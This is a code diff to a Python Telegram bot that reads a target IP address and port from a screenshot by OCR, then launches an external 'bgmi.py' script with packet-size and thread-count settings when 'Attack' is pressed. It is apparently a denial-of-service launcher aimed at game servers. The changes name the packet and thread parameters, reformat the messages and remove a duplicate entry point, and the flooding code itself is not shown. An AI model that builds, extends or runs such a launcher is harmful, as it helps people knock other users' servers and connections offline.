@@ -1,4 +1,5 @@
-import os, re, sys, signal, subprocess
+#!/usr/bin/env python3
+import os, re, subprocess
 from io import BytesIO
 from PIL import Image
 import pytesseract
@@ -34,7 +35,11 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
         selected_target[update.effective_chat.id] = (ip, port)
         keyboard = [[KeyboardButton("🚀 Attack"), KeyboardButton("⛔ Stop")]]
         reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
-        await update.message.reply_text(f"Target: `{ip}:{port}`", parse_mode="Markdown", reply_markup=reply_markup)
+        await update.message.reply_text(
+            f"Target: `{ip}:{port}`",
+            parse_mode="Markdown",
+            reply_markup=reply_markup
+        )
     else:
         await update.message.reply_text("IP/Port not found. Send clear screenshot.")
 
@@ -54,10 +59,17 @@ async def handle_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("Already running!")
             return
 
-        command = ["python3", "bgmi.py", ip, str(port), "100", "100"]
+        packet_size = 100   # byte size
+        threads = 100       # number of threads
+
+        # Chạy bgmi.py với IP, PORT, PACKET_SIZE, THREADS
+        command = ["python3", "bgmi.py", ip, str(port), str(packet_size), str(threads)]
         attack_process = subprocess.Popen(command)
 
-        await update.message.reply_text(f"Attack started on `{ip}:{port}`", parse_mode="Markdown")
+        await update.message.reply_text(
+            f"Attack started on `{ip}:{port}`\nPacket size: {packet_size} bytes, Threads: {threads}",
+            parse_mode="Markdown"
+        )
 
     elif text == "⛔ Stop":
         if attack_process and attack_process.poll() is None:
@@ -76,7 +88,5 @@ def main():
     print("Bot running...")
     app.run_polling()
 
-if __name__ == "__main__":
-    main()
 if __name__ == "__main__":
     main()
